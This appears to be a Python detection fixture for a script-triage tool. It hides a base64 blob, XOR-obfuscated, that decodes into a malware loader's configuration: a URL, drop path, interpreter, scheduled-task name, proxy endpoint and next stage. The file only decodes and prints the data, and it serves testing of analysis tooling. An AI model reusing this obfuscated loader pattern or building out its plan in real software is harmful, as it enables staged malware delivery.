#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_e6379155 = ("SndFOUo+WytYZRVnCG4Haw5ROVYlUX0cfw57EmAFWihNIE87XnIWcxB/G34hRClLLkouSy8DdAZvG34hRy5CJwtvBnUFZBBzG0Q0RilKL1wvUzJWN0czViQZegpzB28AbjFdMlM3UiB/F3YYfBN1E28caAluC1Q3WC1DNwo/QzBJJ1MySncAYQ1/CnkmRC1DJ"
    "04gRztUNlAlVjVUIEkmSHUQaAtuHmoDbAJdL0A1QShGIV0+Xy1fNlMhHGwVJ0I6XwB3HnAUewx/IFM2RDJbOF0hVj9RNVotXgFiCmsCbFEiRzVDKkkscxdyAWIQeQl9EmAcfx5zA2ILbAJdNFBtDm8CchN6HXNePV46CDoOOAs8DnIHdRkkTDhMPE91WnUWdR"
    "EjESUTIBclC24WdxpqBmNNJEo8XTFYPBMiGysSdEImED5ON0s+TShaBWQDZgh8QQl8EmYUcQJxIVgsRCtFaglqDjwOOgw/CDpGIEklQB9vDnoSL2xWeSlbNFMhQC1pCHwdMnoPYRVnAnECTi9NYkw5SS1MOF1wE3AUJhQgFiUSIA5+B3sSfAhtH28deAxpG0Q"
    "0VSFJdDcNInIAbwh6G3YyUydGaTlANFwzXXATcBQmFCAWJRIgD38Gchp1GzVQKE0xRSRXPGMNbAFkWQpzAHQRfClZPVwoTWADYAQ2BDAGNQIwTDxOIVkgfxp0EGAPZgh8QXBCdVtrRXVbalBiUGRXYx9xFGwYRzRAIUYjHmwJehVgEnEUOUorRjZaPxFhEiM=")
CODEC_e6379155 = "base64_chunks|rolling_xor|3c"

def load_e6379155():
    return base64.b64decode(MATERIAL_e6379155)

def decode_e6379155(v_a19c):
    v_b27e = bytearray()
    v_e598 = 60
    for value in v_a19c:
        v_b27e.append(value ^ v_e598)
        v_e598 = value
    return bytes(v_b27e)

def recover_e6379155():
    v_d41a = 19 * 7 - 133
    _pass = 0
    while _pass < 1:
        v_b27e = decode_e6379155(load_e6379155())
        _pass += 1
    v_c304 = v_b27e.decode("ascii", "strict")
    return v_c304

def inspect_e6379155():
    return recover_e6379155()

def surface_e6379155():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_e6379155():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_e6379155():
    fields = dict(item.split("=", 1) for item in inspect_e6379155().split("|"))
    analysis_surface = surface_e6379155()
    obfuscation_surface = obfuscation_e6379155()
    operation_plan = ("cpython_loader_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_e6379155())
